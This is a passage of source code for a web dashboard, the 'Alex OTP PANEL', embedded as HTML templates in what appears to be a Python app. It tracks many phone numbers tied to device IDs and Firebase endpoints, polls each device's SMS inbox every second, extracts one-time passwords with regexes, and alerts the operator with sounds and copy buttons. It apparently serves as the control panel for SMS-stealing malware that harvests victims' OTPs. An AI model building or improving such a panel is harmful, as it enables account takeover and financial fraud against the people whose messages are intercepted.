.refresh-icon{cursor:pointer;font-size:20px;color:#94a3b8;user-select:none;padding:6px;min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
.refresh-icon:active{transform:scale(.9)}
.refresh-icon.spinning{animation:spin 1s linear infinite}
.top-number-badge{background:linear-gradient(135deg,#fef3c7,#fde68a);border:2px solid #fbbf24;border-radius:12px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px;font-size:13px;font-weight:700;color:#92400e;box-shadow:0 2px 8px rgba(251,191,36,.2)}
.top-number-badge .tn-icon{font-size:22px;flex-shrink:0}
.top-number-badge .tn-info{flex:1;min-width:0}
.top-number-badge .tn-num{font-size:16px;font-weight:800;color:#78350f;letter-spacing:.5px;word-break:break-all}
.top-number-badge .tn-count{font-size:11px;color:#92400e;font-weight:600;margin-top:2px;opacity:.8}
.top-number-badge .tn-highlight{background:#fbbf24;color:#78350f;padding:2px 8px;border-radius:8px;font-weight:800;font-size:11px}
.sms-list{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(99,102,241,.06)}
.sms-item{padding:16px;border-bottom:1px solid #f1f5f9;position:relative}
.sms-item:last-child{border-bottom:none}
.sms-item.fresh{background:linear-gradient(90deg,#f0fdf4,#fff 60%);border-left:4px solid #16a34a}
.sms-item.otp-item{background:linear-gradient(90deg,#faf5ff,#fff 60%);border-left:4px solid #a855f7}
.sms-item .msg-type-badge{position:absolute;top:10px;right:10px;font-size:9px;font-weight:800;padding:2px 6px;border-radius:6px;letter-spacing:.5px}
.sms-item .msg-type-badge.otp{background:#a855f7;color:#fff}
.sms-item .msg-type-badge.number{background:#16a34a;color:#fff}
.sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;gap:8px;flex-wrap:wrap}
.sender{font-size:12px;font-weight:800;color:#ef4444;letter-spacing:.3px;display:flex;align-items:center;flex-wrap:wrap}
.new-badge{background:linear-gradient(135deg,#dc2626,#ef4444);color:#fff;font-size:9px;font-weight:800;padding:2px 6px;border-radius:10px;margin-left:6px;letter-spacing:.5px;animation:pulseBadge 1s infinite}
@keyframes pulseBadge{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.1);opacity:.8}}
.sms-time{font-size:11px;color:#94a3b8;font-weight:500;white-space:nowrap}
.sms-time.fresh{color:#16a34a;font-weight:700}
.time-ago{font-size:10px;color:#94a3b8;font-weight:600;margin-top:2px;text-align:right}
.time-ago.fresh{color:#16a34a}
.sms-body{font-size:14px;color:#334155;line-height:1.55;word-break:break-word;white-space:pre-wrap}
.sms-body .phone-highlight{background:#fef3c7;color:#92400e;padding:1px 5px;border-radius:4px;font-weight:700;border:1px dashed #fbbf24}
.otp-highlight{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;padding:2px 6px;border-radius:5px;font-weight:700;border:1px dashed #86efac}
.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:10px 16px;background:linear-gradient(135deg,#059669,#10b981);color:#fff;border:none;border-radius:20px;font-weight:700;font-size:12px;cursor:pointer;letter-spacing:.5px;min-height:40px}
.otp-copy-btn:active{transform:scale(.96)}
.empty{text-align:center;padding:50px 20px;color:#94a3b8;font-size:14px;background:#fff;border-radius:14px}
.loading-text{text-align:center;padding:20px;color:#94a3b8;font-size:13px;background:#fff;border-radius:12px;margin-bottom:14px}
.spinner{display:inline-block;width:16px;height:16px;border:2px solid #e2e8f0;border-top-color:#8b5cf6;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
.progress-bar{width:100%;height:6px;background:#e2e8f0;border-radius:3px;overflow:hidden;margin-top:10px}
.progress-fill{height:100%;background:linear-gradient(90deg,#7c3aed,#ec4899);border-radius:3px;transition:width .3s}
.live-badge{display:inline-flex;align-items:center;gap:4px;background:#dcfce7;color:#166534;font-size:10px;font-weight:700;padding:3px 8px;border-radius:20px;margin-left:6px}
.live-badge .dot{width:6px;height:6px;border-radius:50%;background:#16a34a;animation:pulse 1.2s infinite}
.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;box-shadow:0 10px 30px rgba(0,0,0,.2);z-index:9999;transition:transform .3s;pointer-events:none;max-width:90vw;text-align:center}
.toast.show{transform:translateX(-50%) translateY(0)}
.hidden{display:none !important}
@media(min-width:600px){.stats{grid-template-columns:repeat(4,1fr)}}</style></head><body>

<div class="topbar">
<div class="brand"><span class="alex">Alex</span> <span class="panel">OTP PANEL</span></div>
<div class="top-actions">
<button class="refresh-btn" id="refresh-btn" onclick="manualRefresh()" title="Refresh">🔄</button>
<div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
<a href="/logout" class="logout-btn">Logout</a>
</div>
<div class="nav"><a href="/" class="nav-link active">📱 Numbers</a><a href="/otp" class="nav-link otp">🔐 Personal OTP</a></div>
</div>

<div class="container">
<div id="list-view">
<div class="stats">
<div class="stat total" id="stat-total"><div class="label">TOTAL</div><div class="value" id="s-total">0</div></div>
<div class="stat online" id="stat-online"><div class="label">ONLINE</div><div class="value" id="s-online">0</div></div>
<div class="stat offline" id="stat-offline"><div class="label">OFFLINE</div><div class="value" id="s-offline">0</div></div>
<div class="stat otp" id="stat-otp"><div class="label">OTP RATE</div><div class="value" id="s-otp">0%</div></div>
</div>
<div class="quick"><div class="info">📱 Numbers : <b id="q-dev">0</b></div></div>
<div class="filter-live">
<button class="filter-live-btn online" id="btn-online" onclick="setLocalFilter('online')">🟢 Online <span class="count-badge" id="badge-online">0</span></button>
<button class="filter-live-btn offline" id="btn-offline" onclick="setLocalFilter('offline')">🔴 Offline <span class="count-badge" id="badge-offline">0</span></button>
</div>
<div id="loading-text" class="loading-text"><span class="spinner"></span><span id="loading-msg">Loading data...</span><div class="progress-bar"><div class="progress-fill" id="prog-fill" style="width:0%"></div></div></div>
<div id="list-content" class="hidden"><div class="search-box"><input id="search-num" placeholder="🔎 Search number / device" oninput="renderNumbers()"></div><div class="list-header"><h2 id="list-title">📱 All Numbers <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span></h2><span class="count" id="num-count">0</span></div><div id="num-list"></div></div>
</div>

<div id="inbox-view" class="hidden">
<div class="inbox-header">
<div class="inbox-top"><a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a><div style="flex:1"><div class="inbox-num" id="inbox-num">+91 ------</div><div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div></div></div>
<div class="inbox-meta"><span id="inbox-meta">⚡ LIVE · auto 1s · Latest 60 SMS</span><span class="refresh-icon" onclick="loadInbox(true)">🔄</span></div>
</div>
<div id="top-number-badge" class="top-number-badge hidden">
<div class="tn-icon">🏆</div>
<div class="tn-info">
<div class="tn-num" id="tn-num">-</div>
<div class="tn-count">Sabse zyada baar aaya SMS me <span class="tn-highlight" id="tn-count-badge">0 bar</span></div>
</div>
</div>
<div id="sms-container"></div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
let allNumbers = [];
let numbers = [];
let currentNum = null;
let refreshTimer = null;
let lastSig = '';
let lastInboxSig = '';
let allInboxMsgs = [];
let localFilter = 'all';
let lastOtpSeen = '';
let notifPermissionAsked = false;

function toast(text){
  const t = document.getElementById('toast');
  t.textContent = text;
  t.classList.add('show');
  setTimeout(()=>t.classList.remove('show'), 2500);
}

function playOtpSound(){
  try{
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    [880, 1100, 880].forEach((freq, i) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain); gain.connect(ctx.destination);
      osc.frequency.value = freq;
      const t = ctx.currentTime + i * 0.2;
      gain.gain.setValueAtTime(0.2, t);
      gain.gain.exponentialRampToValueAtTime(0.001, t + 0.18);
      osc.start(t); osc.stop(t + 0.18);
    });
  }catch(e){}
}

function askNotificationPermission(){
  if(notifPermissionAsked) return;
  notifPermissionAsked = true;
  if('Notification' in window && Notification.permission === 'default'){
    Notification.requestPermission();
  }
}

function showOtpNotification(otp, from, message){
  toast('🔔 OTP: ' + otp + ' — ' + from);
  playOtpSound();
  if('Notification' in window && Notification.permission === 'granted'){
    try{
      const n = new Notification('🔔 OTP: ' + otp, {
        body: from + '\n' + message.slice(0, 100),
        tag: 'otp-' + otp,
      });
      setTimeout(()=>n.close(), 10000);
    }catch(e){}
  }
  if(navigator.vibrate){
    try{ navigator.vibrate([200, 100, 200, 100, 200]); }catch(e){}
  }
}

async function manualRefresh(){
  const btn = document.getElementById('refresh-btn');
  btn.classList.add('spinning');
  toast('🔄 Refreshing...');
  try{
    const r = await fetch('/api/refresh', {method: 'POST'});
    const d = await r.json();
    if(d.success){
      setTimeout(()=>loadNumbers(), 800);
      toast('✅ Refresh triggered');
    } else {
      toast('❌ ' + (d.error || 'Refresh failed'));
    }
  }catch(e){
    toast('❌ Network error');
  }
  setTimeout(()=>btn.classList.remove('spinning'), 1500);
}

function setLocalFilter(f){
  if(localFilter === f){ localFilter = 'all'; }
  else { localFilter = f; }
  updateFilterButtons();
  applyLocalFilter();
  renderNumbers();
}

function updateFilterButtons(){
  document.getElementById('btn-online').classList.toggle('active-filter', localFilter === 'online');
  document.getElementById('btn-offline').classList.toggle('active-filter', localFilter === 'offline');
  let titleText = '📱 All Numbers';
  if(localFilter === 'online') titleText = '🟢 Online Numbers';
  else if(localFilter === 'offline') titleText = '🔴 Offline Numbers';
  document.getElementById('list-title').innerHTML = titleText + ' <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span>';
}

function applyLocalFilter(){
  if(localFilter === 'online') numbers = allNumbers.filter(n => n.online === true);
  else if(localFilter === 'offline') numbers = allNumbers.filter(n => n.online !== true);
  else numbers = allNumbers.slice();
  document.getElementById('num-count').textContent = numbers.length;
}

async function checkConn(){
  try{
    const r = await fetch('/api/conn');
    const d = await r.json();
    const badge = document.getElementById('conn-badge');
    const txt = document.getElementById('conn-text');
    if(d.mongo_connected){
      badge.className = 'conn online';
      txt.textContent = 'Live';
    } else {
      badge.className = 'conn offline';
      txt.textContent = 'Off';
    }
  }catch(e){}
}

function flash(id){
  const el = document.getElementById(id);
  if(!el) return;
  el.classList.add('flash');
  setTimeout(()=>el.classList.remove('flash'), 400);
}

async function loadNumbers(){
  try{
    const r = await fetch('/api/numbers');
    const d = await r.json();
    if(!d.success){
      document.getElementById('loading-msg').textContent = '❌ '+(d.error||'Error');
      return;
    }
    allNumbers = d.numbers || [];
    if(parseInt(document.getElementById('s-total').textContent) !== d.total) flash('stat-total');
    if(parseInt(document.getElementById('s-online').textContent) !== d.online) flash('stat-online');
    if(parseInt(document.getElementById('s-offline').textContent) !== d.offline) flash('stat-offline');
    document.getElementById('s-total').textContent = d.total;
    document.getElementById('s-online').textContent = d.online;
    document.getElementById('s-offline').textContent = d.offline;
    document.getElementById('s-otp').textContent = d.otp_rate + '%';
    document.getElementById('q-dev').textContent = allNumbers.length;
    document.getElementById('badge-online').textContent = d.online;
    document.getElementById('badge-offline').textContent = d.offline;
    if(d.progress){
      const pct = d.progress.total > 0 ? Math.floor(d.progress.done / d.progress.total * 100) : 0;
      document.getElementById('prog-fill').style.width = pct + '%';
      document.getElementById('loading-msg').textContent = `Fetching ${d.progress.done}/${d.progress.total} (${pct}%)...`;
    }
    applyLocalFilter();
    const badge = document.getElementById('live-badge');
    if(d.loading && allNumbers.length > 0 && badge) badge.style.display = 'inline-flex';
    else if(badge) badge.style.display = 'none';
    if(allNumbers.length > 0){
      document.getElementById('loading-text').classList.add('hidden');
      document.getElementById('list-content').classList.remove('hidden');
      const sig = allNumbers.length + '|' + d.online + '|' + d.otp_rate + '|' + localFilter;
      if(sig !== lastSig){ lastSig = sig; renderNumbers(); }
    } else if(d.loading){
      document.getElementById('loading-text').classList.remove('hidden');
      document.getElementById('list-content').classList.add('hidden');
    } else {
      document.getElementById('loading-text').classList.remove('hidden');
      document.getElementById('loading-msg').textContent = '📭 No numbers found';
      document.getElementById('list-content').classList.add('hidden');
    }
  }catch(e){
    document.getElementById('loading-msg').textContent = '❌ Network error';
  }
}

// ✅ USER: Raw Data button NAHI
function renderNumbers(){
  const q = (document.getElementById('search-num').value || '').toLowerCase();
  const box = document.getElementById('num-list');
  const filtered = numbers.filter(n => !q ||
    (n.number||'').toLowerCase().includes(q) ||
    (n.device_name||'').toLowerCase().includes(q));
  if(filtered.length === 0){
    box.innerHTML = '<div class="empty">📭 No numbers found</div>';
    return;
  }
  box.innerHTML = filtered.map(n => {
    const isOnline = n.online === true;
    const isUnknown = (n.number || '').startsWith('UNKNOWN-');
    const iconCls = isUnknown ? 'gray' : (isOnline ? '' : 'red');
    const badgeCls = isOnline ? 'badge-online' : 'badge-offline';
    const badgeTxt = isOnline ? 'Online' : 'Offline';
    const cardCls = isOnline ? '' : 'offline';
    const titleCls = isUnknown ? 'unknown' : '';
    const confidence = n.confidence || 0;
    let confBadge = '';
    if(!isUnknown && confidence > 0){
      confBadge = `<span class="confidence-badge">✓ ${confidence}x</span>`;
    } else if(!isUnknown){
      confBadge = `<span class="confidence-badge low">⚠️ 1x</span>`;
    }
    return `
      <div class="num-card ${cardCls}">
        <div class="num-icon ${iconCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})">${isUnknown ? '❓' : '📶'}</div>
        <div class="num-info" onclick="openInboxGlobal(${numbers.indexOf(n)})">
          <div class="num-title ${titleCls}">${escapeHtml(n.number)} ${confBadge}</div>
          <div class="num-sub">
            <span class="pill">📨 ${n.msg_count} SMS</span>
            ${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}
          </div>
        </div>
        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
      </div>
    `;
  }).join('');
}

function openInboxGlobal(idx){
  if(idx < 0 || idx >= numbers.length) return;
  openInbox(numbers[idx]);
}

async function openInbox(n){
  currentNum = n;
  lastInboxSig = '';
  allInboxMsgs = [];
  lastOtpSeen = '';
  askNotificationPermission();
  document.getElementById('list-view').classList.add('hidden');
  document.getElementById('inbox-view').classList.remove('hidden');
  const inboxNumEl = document.getElementById('inbox-num');
  inboxNumEl.textContent = n.number;
  if((n.number || '').startsWith('UNKNOWN-')){
    inboxNumEl.className = 'inbox-num unknown';
  } else {
    inboxNumEl.className = 'inbox-num';
  }
  const statusEl = document.getElementById('inbox-status');
  const statusTxt = document.getElementById('inbox-status-text');
  if(n.online === true){
    statusEl.className = 'inbox-status';
    statusTxt.textContent = 'Online';
  } else {
    statusEl.className = 'inbox-status offline';
    statusTxt.textContent = 'Offline';
  }
  document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading messages...</div>';
  await loadInbox(false);
  if(refreshTimer) clearInterval(refreshTimer);
  refreshTimer = setInterval(()=>loadInbox(false), 1000);
}

function findTopNumber(msgs){
  const counter = {};
  const senderNums = new Set();
  msgs.forEach(m => {
    const from = m.from || '';
    const found = from.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
    found.forEach(n => senderNums.add(n));
  });
  msgs.forEach(m => {
    const text = m.message || '';
    const found = text.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
    found.forEach(n => {
      if(senderNums.has(n)) return;
      if(n.startsWith('1800') || n.startsWith('1900') || n.startsWith('1991')) return;
      counter[n] = (counter[n] || 0) + 1;
    });
  });
  let topNum = null, topCount = 0;
  for(const [num, cnt] of Object.entries(counter)){
    if(cnt > topCount){ topNum = num; topCount = cnt; }
  }
  return topNum ? {number: topNum, count: topCount} : null;
}

function updateTopNumberBadge(msgs){
  const badge = document.getElementById('top-number-badge');
  const top = findTopNumber(msgs);
  if(top && top.count >= 2){
    document.getElementById('tn-num').textContent = '📞 ' + top.number;
    document.getElementById('tn-count-badge').textContent = top.count + ' bar';
    badge.classList.remove('hidden');
  } else {
    badge.classList.add('hidden');
  }
}

async function loadInbox(showLoader){
  if(!currentNum) return;
  if(showLoader){
    document.getElementById('sms-container').innerHTML =
      '<div class="empty"><span class="spinner"></span> Refreshing...</div>';
  }
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 15000);
  try{
    const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase)
      + '&id=' + encodeURIComponent(currentNum.device_id)
      + '&num=' + encodeURIComponent(currentNum.number), { signal: controller.signal });
    clearTimeout(timeoutId);
    const d = await r.json();
    if(!d.success){
      document.getElementById('sms-container').innerHTML =
        '<div class="empty">❌ '+(d.error||'Error')+'</div>';
      return;
    }
    const msgs = d.messages || [];
    allInboxMsgs = msgs;
    if(msgs.length > 0){
      const newest = msgs[0];
      const newestOtp = newest.otp || extractOtp(newest.message);
      const sig = (newest.timestamp || 0) + '|' + newestOtp + '|' + (newest.message||'').slice(0,40);
      if(newestOtp && sig !== lastOtpSeen){
        lastOtpSeen = sig;
        showOtpNotification(newestOtp, newest.from || 'Unknown', newest.message || '');
      }
    }
    const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
    if(sig !== lastInboxSig){
      lastInboxSig = sig;
      renderMessages();
    }
  }catch(e){
    clearTimeout(timeoutId);
  }
}

function timeAgo(ts, now){
  if(!ts) return '';
  const diff = now - ts;
  if(diff < 10) return 'अभी';
  if(diff < 60) return `${diff}s पहले`;
  if(diff < 3600) return `${Math.floor(diff/60)}m पहले`;
  if(diff < 86400) return `${Math.floor(diff/3600)}h पहले`;
  return `${Math.floor(diff/86400)}d पहले`;
}

function highlightPhoneNumbers(text){
  return text.replace(/(?<!\d)([6-9]\d{9})(?!\d)/g, '<span class="phone-highlight">$1</span>');
}

function renderMessages(){
  const box = document.getElementById('sms-container');
  const now = Math.floor(Date.now() / 1000);
  let msgs = [...allInboxMsgs]
    .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))
    .slice(0, 60);
  
  updateTopNumberBadge(msgs);
  
  if(!msgs.length){
    box.innerHTML = `<div class="empty">📭 No SMS</div>`;
    return;
  }
  box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
    const otp = m.otp || extractOtp(m.message);
    let body;
    if(otp){
      body = escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`);
      body = highlightPhoneNumbers(body);
    } else {
      body = highlightPhoneNumbers(escapeHtml(m.message));
    }
    const copyBtn = otp
      ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 Copy OTP ${otp}</button>`
      : '';
    const ts = m.timestamp || 0;
    const isFresh = ts >= (now - 120);
    const cls = isFresh ? 'fresh' : (otp ? 'otp-item' : '');
    const timeStr = m.date_string ? m.date_string : fmtTime(ts);
    const ago = timeAgo(ts, now);
    const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
    const hasNumber = /[6-9]\d{9}/.test(m.message || '');
    let typeBadge = '';
    if(otp){ typeBadge = '<span class="msg-type-badge otp">OTP</span>'; }
    else if(hasNumber){ typeBadge = '<span class="msg-type-badge number">📞 NUM</span>'; }
    return `
      <div class="sms-item ${cls}">
        ${typeBadge}
        <div class="sms-head">
          <div class="sender">${escapeHtml(m.from || 'Unknown')} ${newBadge}</div>
          <div style="text-align:right">
            <div class="sms-time ${isFresh?'fresh':''}">${escapeHtml(timeStr)}</div>
            <div class="time-ago ${isFresh?'fresh':''}">${ago}</div>
          </div>
        </div>
        <div class="sms-body">${body}</div>
        ${copyBtn}
      </div>
    `;
  }).join('') + '</div>';
}

function backToList(){
  document.getElementById('inbox-view').classList.add('hidden');
  document.getElementById('list-view').classList.remove('hidden');
  if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
  currentNum = null;
}

function extractOtp(text){
  if(!text) return '';
  const t = String(text);
  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i);
  if(m) return m[1];
  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
  if(m) return m[1];
  m = t.match(/#(\d{4,8})/);
  if(m) return m[1];
  return '';
}

function fmtTime(ts){
  if(!ts) return '';
  try{
    let t = parseInt(ts);
    if(t > 1e12) t = Math.floor(t/1000);
    if(t < 1e9) return String(ts);
    const d = new Date(t * 1000);
    const opts = { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' };
    return d.toLocaleString('en-IN', opts).replace(',', ' |');
  }catch(e){ return String(ts); }
}

function copyOtp(code){
  const done = ()=>toast('✅ Copied: ' + code);
  if(navigator.clipboard){
    navigator.clipboard.writeText(code).then(done).catch(()=>{
      const ta = document.createElement('textarea');
      ta.value = code; document.body.appendChild(ta);
      ta.select(); document.execCommand('copy'); ta.remove(); done();
    });
  }
}

function escapeHtml(s){
  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  })[c]);
}

checkConn();
loadNumbers();
setInterval(checkConn, 8000);
setInterval(()=>{ if(!currentNum) loadNumbers(); }, 5000);
</script>
</body>
</html>
"""


# ==================== PERSONAL OTP PANEL ====================
PERSONAL_OTP_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Personal OTP Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#059669">
<style>""" + MOBILE_CSS + r"""
body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
.brand{font-size:17px;font-weight:800;letter-spacing:-.5px}
.brand .alex{background:linear-gradient(90deg,#059669,#10b981);-webkit-background-clip:text;background-clip:text;color:transparent}
.brand .panel{color:#1e293b}
.top-actions{display:flex;align-items:center;gap:8px}
.refresh-btn{background:linear-gradient(135deg,#059669,#10b981);color:#fff;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(5,150,105,.3);padding:0}
.refresh-btn:active{transform:scale(.9) rotate(180deg)}
.refresh-btn.spinning{animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
@media(min-width:640px){.nav{order:0;width:auto}}
.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:13px;font-weight:600;color:#475569;background:#f1f5f9;white-space:nowrap;min-height:44px;display:inline-flex;align-items:center}
.nav-link.active{background:linear-gradient(135deg,#059669,#10b981);color:#fff}
.nav-link.purple{background:linear-gradient(135deg,#ede9fe,#ddd6fe);color:#6d28d9}
.conn{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;padding:6px 10px;border-radius:20px}
.conn.online{color:#16a34a;background:#dcfce7}
.conn.offline{color:#dc2626;background:#fee2e2}
.conn.loading{color:#d97706;background:#fef3c7}
.conn .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
.conn.online .dot{animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.container{max-width:900px;margin:0 auto;padding:14px}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
.stat{background:#fff;border-radius:14px;padding:14px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
.stat .label{font-size:10px;color:#94a3b8;font-weight:600;letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px}
.stat .value{font-size:26px;font-weight:800;letter-spacing:-1px}
.stat.total .value{color:#2563eb}
.stat.online .value{color:#16a34a}
.stat.offline .value{color:#dc2626}
.stat.otp .value{color:#a855f7}
.quick{background:#fff;border-radius:14px;padding:14px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 8px rgba(99,102,241,.06);flex-wrap:wrap;gap:10px}
.quick .info{font-size:13px;color:#475569}
.quick .info b{color:#1e293b;font-size:15px}
.filter-live{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
.filter-live-btn{flex:1;min-width:130px;padding:14px 12px;border-radius:12px;border:2px solid transparent;cursor:pointer;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:6px;background:none;font-family:inherit;min-height:52px}
.filter-live-btn:active{transform:scale(.97)}
.filter-live-btn.online{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;border-color:#86efac}
.filter-live-btn.offline{background:linear-gradient(135deg,#fee2e2,#fecaca);color:#991b1b;border-color:#fca5a5}
.filter-live-btn.active-filter{box-shadow:0 0 0 4px rgba(99,102,241,.3)}
.filter-live-btn .count-badge{background:rgba(0,0,0,.15);padding:2px 8px;border-radius:10px;font-size:11px}
.list-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;padding:0 4px}
.list-header h2{font-size:14px;font-weight:700;color:#334155}
.list-header .count{font-size:12px;color:#64748b;background:#e2e8f0;padding:3px 10px;border-radius:20px;font-weight:600}
.search-box{margin-bottom:12px}
.search-box input{width:100%;padding:14px 16px;border-radius:12px;border:1.5px solid #e2e8f0;background:#fff;outline:none;color:#1e293b}
.search-box input:focus{border-color:#10b981}
.num-card{background:#fff;border-radius:14px;padding:14px;margin-bottom:10px;display:flex;align-items:center;gap:12px;cursor:pointer;min-height:70px}
.num-card:active{transform:scale(.98);background:#fafafa}
.num-icon{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0;background:linear-gradient(135deg,#dcfce7,#bbf7d0)}
.num-icon.red{background:linear-gradient(135deg,#fee2e2,#fecaca)}
.num-icon.gray{background:linear-gradient(135deg,#f1f5f9,#e2e8f0)}
.num-info{flex:1;min-width:0}
.num-title{font-size:14px;font-weight:700;color:#1e293b;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.num-title.unknown{color:#94a3b8;font-style:italic}
.num-sub{font-size:11px;color:#94a3b8;margin-top:4px;display:flex;gap:4px;flex-wrap:wrap}
.num-sub .pill{background:#f1f5f9;padding:2px 7px;border-radius:6px;color:#64748b;font-size:10px;font-weight:600}
.num-sub .pill.otp{background:#ede9fe;color:#7c3aed}
.badge-online{display:flex;align-items:center;gap:5px;font-size:11px;color:#16a34a;font-weight:600;flex-shrink:0}
.badge-online .dot{width:8px;height:8px;border-radius:50%;background:#16a34a}
.badge-offline{display:flex;align-items:center;gap:5px;font-size:11px;color:#dc2626;font-weight:600;flex-shrink:0}
.badge-offline .dot{width:8px;height:8px;border-radius:50%;background:#dc2626}
.arrow{color:#cbd5e1;font-size:20px}
.fb-add-card{background:linear-gradient(135deg,#ecfdf5,#d1fae5);border:2px solid #6ee7b7;border-radius:14px;padding:16px;margin-bottom:14px}
.fb-add-card h3{font-size:13px;font-weight:700;color:#065f46;margin-bottom:10px;display:flex;align-items:center;gap:8px}
.fb-add-row{display:flex;gap:8px;flex-wrap:wrap}
.fb-add-row input{flex:1;min-width:180px;padding:14px 12px;border-radius:10px;border:1.5px solid #6ee7b7;background:#fff;outline:none;color:#1e293b;font-family:monospace}
.fb-add-row input:focus{border-color:#10b981;box-shadow:0 0 0 4px rgba(16,185,129,.15)}
.fb-add-row button{padding:14px 18px;border:none;border-radius:10px;font-weight:600;font-size:14px;min-height:50px}
.fb-add-row button.primary{background:linear-gradient(135deg,#059669,#10b981);color:#fff}
.fb-add-row button.gray{background:#f1f5f9;color:#475569}
.fb-add-row button:active{transform:scale(.96)}
.bulk-area{margin-top:10px;display:none}
.bulk-area textarea{width:100%;padding:14px 12px;border-radius:10px;border:1.5px solid #6ee7b7;background:#fff;font-size:13px;min-height:120px;font-family:monospace;outline:none;color:#1e293b;resize:vertical}
.bulk-area button{margin-top:8px;padding:12px 18px;border:none;border-radius:10px;font-weight:600;font-size:13px;background:linear-gradient(135deg,#059669,#10b981);color:#fff;min-height:48px}
.fb-msg{margin-top:10px;padding:12px 14px;border-radius:10px;font-size:13px;display:none}
.fb-msg.ok{background:#dcfce7;color:#166534;display:block}
.fb-msg.err{background:#fee2e2;color:#991b1b;display:block}
.my-fb-list{display:grid;gap:8px;margin-top:10px}
.my-fb-card{background:#fff;border:1.5px solid #e2e8f0;border-radius:12px;padding:12px;display:flex;align-items:center;gap:10px}
.my-fb-card .fb-icon{width:38px;height:38px;border-radius:9px;background:linear-gradient(135deg,#d1fae5,#a7f3d0);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
.my-fb-card .fb-info{flex:1;min-width:0}
.my-fb-card .fb-label{font-size:12px;font-weight:700;color:#065f46;word-break:break-all}
.my-fb-card .fb-hash{font-size:10px;color:#94a3b8;font-family:monospace;margin-top:2px}
.my-fb-card .fb-actions button{padding:10px 14px;font-size:12px;background:#fef2f2;color:#dc2626;border:none;border-radius:8px;font-weight:600;min-height:42px}
.inbox-header{background:#fff;border-radius:14px;padding:16px;margin-bottom:12px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
.inbox-top{display:flex;align-items:center;gap:10px;margin-bottom:12px}
.back-btn{background:#f1f5f9;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;cursor:pointer;color:#475569;font-weight:600;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0}
.back-btn:active{transform:scale(.9)}
.inbox-num{font-size:16px;font-weight:800;color:#1e293b}
.inbox-num.unknown{color:#94a3b8;font-style:italic}
